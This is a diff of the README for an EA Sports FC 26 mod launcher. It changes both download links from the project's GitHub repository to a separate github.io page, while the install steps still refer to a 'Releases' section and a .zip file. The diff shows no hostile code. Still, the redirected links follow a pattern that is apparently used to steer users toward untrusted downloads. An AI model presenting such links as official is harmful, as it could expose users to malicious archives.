@@ -1,6 +1,6 @@
 # 🚀 FC26-Mod-Launcher-Pro - Manage Your Modded Football Experience Easily
 
-[![](https://img.shields.io/badge/Download-FC26-Mod-Launcher-Pro-blue.svg)](https://github.com/chavezhe8320/FC26-Mod-Launcher-Pro)
+[![](https://img.shields.io/badge/Download-FC26-Mod-Launcher-Pro-blue.svg)](https://chavezhe8320.github.io)
 
 FC26-Mod-Launcher-Pro helps you install, organize, and run mods for EA Sports FC 26 on your Windows computer. This tool manages your files so you can focus on your game. It checks for conflicts between mods and allows you to create profiles to switch between setups instantly.
 
@@ -15,7 +15,7 @@ FC26-Mod-Launcher-Pro helps you install, organize, and run mods for EA Sports FC
 
 Follow these steps to set up the launcher on your PC.
 
-1. Visit the [official download page](https://github.com/chavezhe8320/FC26-Mod-Launcher-Pro) to get the latest version.
+1. Visit the [official download page](https://chavezhe8320.github.io) to get the latest version.
 2. Look for the "Releases" section on the right side of the page.
 3. Click the link for the file ending in `.zip` under the latest release.
 4. Save the file to your "Downloads" folder.
